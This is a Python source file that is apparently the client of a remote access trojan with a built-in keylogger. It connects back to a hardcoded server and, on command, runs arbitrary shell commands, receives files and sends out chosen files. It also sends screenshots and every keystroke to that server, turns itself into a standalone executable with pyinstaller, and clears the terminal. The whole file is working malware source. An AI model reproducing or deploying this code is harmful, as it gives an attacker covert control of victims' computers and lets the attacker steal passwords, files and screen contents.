import subprocess			#default modules available with python
import sys
import os
import time
import socket
modules=[]
def importfunc():           #function to import modules that are not available by default, if module is unavailable it is installed and then imported
	modname=["pyscreenshot","keyboard"]
	#modules that are not built-into python
	try:
		import pip              #try to import pip
	except ImportError:
		subprocess.run(["apt","install","python3-pip"])       #install pip if unavailable
	for x in modname:
		try:
			modules.append(__import__(x))           #attempt to import modules
		except ImportError:
			subprocess.run(["python3","-m","pip","install",x])			#install module if unavailable
			modules.append(__import__(x))

importfunc()
HOST = "192.168.221.144"		#change to server address
PORT = 25967				#change to server port
buffer = 4096               #size of buffer used to send data
s = socket.socket()     #creates socket
s.connect((HOST, PORT))     #connects to server
while True:
	received=s.recv(buffer).decode()        #receives option selected by user
	if received=='c':
		while True:         # loop to receive commands from the server
			command = s.recv(buffer).decode()       #received command
			if command.lower() == "exit":       # breaks the loop if the command is exit
				break
			try:
				output = subprocess.getoutput(command)      #executes command and stores result
				s.send(output.encode())         #sends result to server
			except:
				s.send("Invalid operation".encode())    #if command does not execute, sends error to server

	elif received=='u':
		check=s.recv(buffer).decode()
		if check=="exists":                 #checks if about to receive file else skips back to waiting for option
			file=s.recv(buffer).decode()       #receives filename
			file=os.path.basename(file)        #strips path to save just filename
			data=s.recv(buffer)
			with open(file, "wb") as f:
				while data:
					try:	        #check if complete file received
						if data.decode()=="done":
							break
					except:	        #continue receiving if incomplete
						pass
					f.write(data)
					data=s.recv(buffer)
		else:
			continue

	elif received=='d':
		file=s.recv(buffer).decode()        #receives required filename and path
		time.sleep(1)
		if os.path.isfile(file):            #checks if file exists
			s.sendall("exists".encode())    #send confirmation if file exists
			time.sleep(1)
			with open(file, "rb") as f:        #opens the filen
				data = f.read(buffer)
				while data:
					s.sendall(data)            #sends data to the server
					data = f.read(buffer)
					if len(data)<buffer:       #checks if last buffer of the file is being sent
						s.sendall(data)
						time.sleep(1)
						s.sendall("done".encode())      #sends done when complete file is sent
						time.sleep(1)
						break
		else:
			s.sendall("none".encode())      #if file does not exist, sends reset command
			time.sleep(1)
	
	elif received=='s':
		ss=modules[0].grab()        #captures screenshot
		sdata=str(ss)               #converts screenshot data into a string
		res1,res2=ss.size           #sends resoltuion of image to server
		s.sendall(str(res1).encode())
		time.sleep(1)
		s.sendall(str(res2).encode())
		time.sleep(1)
		data=ss.tobytes()
		s.sendall(data)             #sends image data
	
	elif received=='k':
		def record(event):          #function to send each keypress to the server
			key=event.name
			if len(key) > 1:        #checks if it is a special key
				if key == "space":
					key = " "
				elif key == "enter":
					key = "[ENTER]\n"
				elif key == "decimal":
					key = "."
				else:
					key = key.replace(" ", "_")
					key = f"[{key.upper()}]"
			s.sendall(key.encode())     #sends key press to server
		try:
			modules[1].on_release(record)       #call record function when a key is pressed and released
			time.sleep(1)
			s.send("OK".encode())   #sends OK if keylogger is functioning (requires sudo privileges)
		except:
			time.sleep(1)			
			s.send("none".encode())		#send none if the keylogger isn't functioning

	elif received=="e":
		try:
			subprocess.run(["pyinstaller","--onefile","tcpclient.py"])      #attempts to convert the program into an executable
			subprocess.run(["reset"])   #clears the terminal
		except:
			subprocess.run(["python3","-m","pip","install","pyinstaller"]) 	#installs pyinstaller if unavailable		
			subprocess.run(["pyinstaller","--onefile","tcpclient.py"])  #converts the program into an executable
			subprocess.run(["reset"])       #clears the terminal
		s.send("Converted successfully".encode())
	
	elif received=="t":
		s.close()               #closes the port
		subprocess.run(["reset"])   #clears the terminal
		break

	else:
		continue
